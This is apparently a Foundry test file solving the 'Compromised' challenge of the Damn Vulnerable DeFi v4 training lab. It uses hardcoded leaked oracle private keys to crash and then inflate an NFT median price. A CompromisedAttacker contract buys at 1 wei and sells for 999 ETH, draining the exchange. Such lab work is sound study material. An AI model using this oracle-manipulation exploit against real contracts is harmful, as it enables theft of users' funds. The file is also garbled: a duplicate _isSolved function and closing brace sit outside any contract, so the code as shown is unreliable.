// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(address(exchange).balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(oracle.getMedianPrice(symbols[0]), INITIAL_NFT_PRICE);
    }

     /**
     * CODE YOUR SOLUTION HERE
     * =========================================================
     * Attack: Oracle manipulation via leaked private keys
     *
     * The leaked HTTP response data decodes (hex -> ASCII -> Base64)
     * to the private keys of 2 of the 3 trusted oracle sources, giving
     * majority control of the median price:
     * 1. Crash price to 0 (sources post 0 -> median [0,0,999] = 0)
     * 2. Buy one DVNFT for 1 wei (price 0, 1 wei change returned)
     * 3. Inflate price to 999 ETH and sell -> drains the exchange
     * 4. Restore the median to INITIAL_NFT_PRICE (required by _isSolved)
     * 5. Forward exactly the drained 999 ETH to recovery
     *
     * Uses checkSolved (no player prank). Oracle writes via vm.prank(source).
     * =========================================================
     */
    function test_compromised() public checkSolved {
        // Private keys recovered by decoding the leaked response:
        // remove spaces -> hex bytes -> ASCII string -> Base64 decode -> private key
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address source1 = vm.addr(privateKey1); // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
        address source2 = vm.addr(privateKey2); // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8

        // 1. Crash the median to 0 (two of three sources post 0)
        vm.prank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.prank(source2);
        oracle.postPrice("DVNFT", 0);

        // 2. Buy one NFT for 1 wei (price is 0, change returned)
        CompromisedAttacker attacker = new CompromisedAttacker{value: 1}(oracle, exchange, nft, recovery);
        attacker.buy();

        // 3. Inflate the median to the exchange's full balance, then sell to drain it
        vm.prank(source1);
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.prank(source2);
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        attacker.sell();

        // 4. Restore the original median price (checked by _isSolved)
        vm.prank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        // 5. Forward the drained ETH to recovery
        attacker.recover();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT — CompromisedAttacker
 * =========================================================
 * Holds ETH and the purchased NFT between the price-manipulation
 * steps performed in the test via vm.prank. Implements
 * IERC721Receiver because the exchange mints via safeMint().
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice Intermediate contract for the Compromised exploit.
 * @dev Buys at price 0, sells at 999 ETH, forwards the proceeds to recovery.
 */
contract CompromisedAttacker is IERC721Receiver {
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    address recovery;
    uint256 nftId;

    /**
     * @param _oracle The TrustfulOracle (stored for reference)
     * @param _exchange The Exchange to buy from and sell to
     * @param _nft The DamnValuableNFT token contract
     * @param _recovery Destination for the recovered ETH
     */
    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    /// @notice Buy one NFT (price must be 0 when called; 1 wei change is returned)
    function buy() external {
        nftId = exchange.buyOne{value: 1}();
    }

    /// @notice Sell the NFT (price must be set to the exchange balance when called)
    function sell() external {
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    /// @notice Forward the drained proceeds to recovery (1-wei working capital stays behind)
    function recover() external {
        payable(recovery).transfer(999 ether);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
